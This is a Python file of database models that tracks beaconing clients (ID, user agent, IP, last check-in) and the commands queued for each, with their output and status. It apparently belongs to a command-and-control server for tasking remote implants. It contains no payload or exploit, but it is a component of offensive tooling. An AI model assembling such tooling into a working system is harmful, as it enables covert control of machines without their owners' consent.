from app import db
from .utils import get_date, datetime_to_text, dict_to_beautified_json


class Client(db.Model):
    """ Represents a Client in the system """

    __tablename__ = 'client'

    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(36), unique=True)
    user_agent = db.Column(db.String(1024))
    ip = db.Column(db.String(15))
    last_beaconed = db.Column(db.DateTime(), default=get_date)
    commands = db.relationship('Command', back_populates="client")

    def __init__(self, uuid, user_agent, ip):
        self.client_id = uuid
        self.user_agent = user_agent
        self.ip = ip

    def get_printable(self):
        for cmd in self.commands:
            if cmd.is_returned and not cmd.is_printed:
                return cmd

    def update_beacon(self):
        self.last_beaconed = get_date()

    def add_command(self, cmd):
        c = Command(cmd)
        self.commands.append(c)
        db.session.add(c)

    def add_commands(self, cmds):
        for cmd in cmds:
            self.add_command(cmd)

    def to_dict(self):
        return {
            'id': self.id,
            'client_id': self.client_id,
            'user_agent': self.user_agent,
            'ip': self.ip,
            'last_beaconed': datetime_to_text(self.last_beaconed),
            'commands': [cmd.to_dict() for cmd in self.commands]
        }

    def __repr__(self):
        return dict_to_beautified_json(self.to_dict())


class Command(db.Model):
    """ Represents a Command of a Client """

    __tablename__ = 'command'

    id = db.Column(db.Integer, primary_key=True)
    cmd = db.Column(db.String(1024))
    output = db.Column(db.String(1024))
    created_on = db.Column(db.DateTime(), default=get_date)
    is_served = db.Column(db.Boolean, default=0)
    is_returned = db.Column(db.Boolean, default=0)
    is_printed = db.Column(db.Boolean, default=0)
    rel_client_id = db.Column(db.Integer, db.ForeignKey('client.id'))
    client = db.relationship("Client", back_populates="commands")

    def __init__(self, cmd, output=''):
        self.cmd = cmd
        self.output = output

    def to_dict(self):
        return {
            'id': self.id,
            'cmd': self.cmd,
            'output': self.output,
            'created_on': datetime_to_text(self.created_on),
            'is_served': self.is_served,
            'is_returned': self.is_returned,
            'is_printed': self.is_printed,
            'rel_client': self.rel_client_id,
        }

    def __repr__(self):
        return dict_to_beautified_json(self.to_dict())



